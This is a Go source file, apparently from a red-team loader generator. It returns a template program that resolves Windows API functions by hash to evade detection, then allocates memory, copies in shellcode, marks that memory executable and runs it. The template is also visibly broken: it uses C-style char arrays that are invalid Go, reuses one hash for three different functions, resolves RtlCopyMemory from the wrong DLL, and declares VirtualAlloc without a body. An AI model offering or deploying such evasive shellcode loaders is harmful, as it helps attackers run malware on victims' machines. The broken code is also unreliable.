package loaders

import (
	"fmt"
)

func GetSyscallAPIHashTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	return fmt.Sprintf(`
package main

import (
	"syscall"
	"unsafe"
    "fmt"
    "os"

    loader "github.com/cmepw/myph/internals"
	"github.com/Binject/debug/pe"
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

func VirtualAlloc(address uintptr, size uintptr, alloctype uint32, protect uint32) (value uintptr, err error)


func ExecuteOrderSixtySix(shellcode []byte) {

    kernel32FullName []char = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0'};
    kernel32, err := pe.Open(kernel32FullName); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer kernel32.Close()


    virtualAllocPtr, err := loader.LoadFunctionFromHash(loader.HashDjb2, kernel32, "782024e6b5fe6881")
    if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }

    virtualAlloc := *(*loader.VirtualAlloc)(unsafe.Pointer(&virtualAllocPtr))
	addr, _, _ := virtualAlloc(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)


    ntdllFullName []char = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
    ntdll, err := pe.Open(ntdllFullName); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer ntdll.Close()

    rtlCopyMemoryPtr, err := loader.LoadFunctionFromHash(loader.HashDjb2, kernel32, "782024e6b5fe6881")
    if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }

    rtlCopyMemory := *(*loader.RtlCopyMemory)(unsafe.Pointer(&rtlCopyMemoryPtr))
    _, _, _ = rtlCopyMemory(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))


    virtualProtectPtr, err := loader.LoadFunctionFromHash(loader.HashDjb2, kernel32, "782024e6b5fe6881")
    if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }

    oldProtect := PAGE_READWRITE
    virtualProtect := *(*loader.VirtualProtect)(unsafe.Pointer(&virtualProtectPtr))
	_, _, _ = virtualProtect(
        addr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    )

	_, _, _ = syscall.Syscall(addr, 0, 0, 0, 0)

}
    `)
}
